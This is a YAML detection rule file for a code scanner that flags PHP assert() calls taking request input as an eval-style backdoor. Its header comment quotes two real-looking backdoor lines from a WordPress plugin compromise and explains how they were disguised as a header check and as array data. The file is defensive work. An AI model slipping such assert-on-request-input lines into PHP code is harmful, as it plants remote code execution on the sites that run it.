# PHP's assert() used as an eval sink on request input.
#
# Before PHP 8, `assert()` given a string *evaluates it as PHP*. That makes
# `assert($_SERVER['HTTP_X_FORWARD_FOR'])` a complete remote code execution
# backdoor that never contains the word `eval`, and it is why assert was the
# preferred sink for injected WordPress plugins for years.
#
# The 2011 plugin-repository compromise shipped two of these. W3 Total Cache's
# PgCache.php got
#
#   if (isset($_SERVER['HTTP_X_FORWARD_FOR']) && assert($_SERVER['HTTP_X_FORWARD_FOR']))
#
# which reads as a proxy-header check. AddThis got its backdoor inside a
# thirty-entry array of language names -- `'re'=>@assert(wp_get_referer())` --
# where the `@` suppresses any error and the surrounding data makes the line
# invisible to anyone scanning for code.
#
# Stated in execution rather than beside the dispatcher rule that already
# covers this incident, because it is a different sink reached a different
# way: no dispatcher, no array of function names, just a header evaluated
# where a boolean was expected.
defaults:
  platforms: [unix, windows]
  for: [php, text]
  attack: T1505.003,T1059.006
  mbc: B0030

traits:

  - id: wp-referer-read
    desc: Reads the WordPress referer
    crit: notable
    conf: 0.85
    if:
      type: text
      regex: '\bwp_get_referer\s*\('

  - id: assert-direct-request-input-argument
    desc: PHP assert directly receives request input
    crit: notable
    conf: 0.96
    # Match the argument inside the assert call AST node. A nearby request read
    # and an unrelated `assert(false)` are not an eval sink.
    if:
      type: tree-sitter
      language: php
      kind: call
      regex: '(?is)\bassert\s*\(\s*@?\s*(\$_(SERVER|GET|POST|REQUEST)\s*\[|wp_get_referer\s*\()'

composite_rules:
  - id: assert-evaluates-request-input
    desc: assert evaluates request input
    # The assert leg is a parsed PHP call, so text-typed files cannot satisfy it.
    for: [php]
    crit: hostile
    conf: 0.96
    all:
      - id: micro-behaviors/data/control-flow/assert::php-assert-call
      - id: assert-direct-request-input-argument
    unless:
      - id: metadata/package/testing/
      - id: "metadata/file/naming::test-directory-component"
